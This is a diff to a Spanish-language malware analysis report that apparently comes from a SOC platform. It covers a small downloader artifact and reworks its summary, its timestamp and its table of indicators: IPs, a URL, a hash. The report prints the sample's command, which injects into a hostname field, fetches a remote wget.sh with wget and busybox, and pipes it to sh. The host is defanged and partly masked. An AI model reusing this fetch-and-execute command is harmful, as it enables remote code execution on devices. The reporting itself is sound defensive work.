@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución. Se asoció 1 comando observado o extraído.
+Artefacto identificado como ASCII text, with no line terminators de 166 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+
 
 ## 🏷️ Clasificación
 
@@ -14,7 +15,7 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T19:45:45+00:00`
+- **Registrado:** `2026-08-09T19:45:45.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -51,10 +52,10 @@ hostname=`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s russ;busybox wget h
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 91.92.40.XXX | static_analysis |
 | url | hxxp://91.92.40.XXX/wget.sh | strings |
-| hash | 5f0481ea757d0d2b5cbe9aff05f87e223bd6592e12ee9e6fbc8ef32cd545f0c9 | static_analysis |
+| ip | 91.92.40.XXX | static_analysis |
 | command | hostname=`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s russ;busybox wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s rus | strings |
+| hash | 5f0481ea757d0d2b5cbe9aff05f87e223bd6592e12ee9e6fbc8ef32cd545f0c9 | static_analysis |
 | ip | 45.156.87.XXX | artifact_source |
 
 ## 🛡️ Nota de publicación
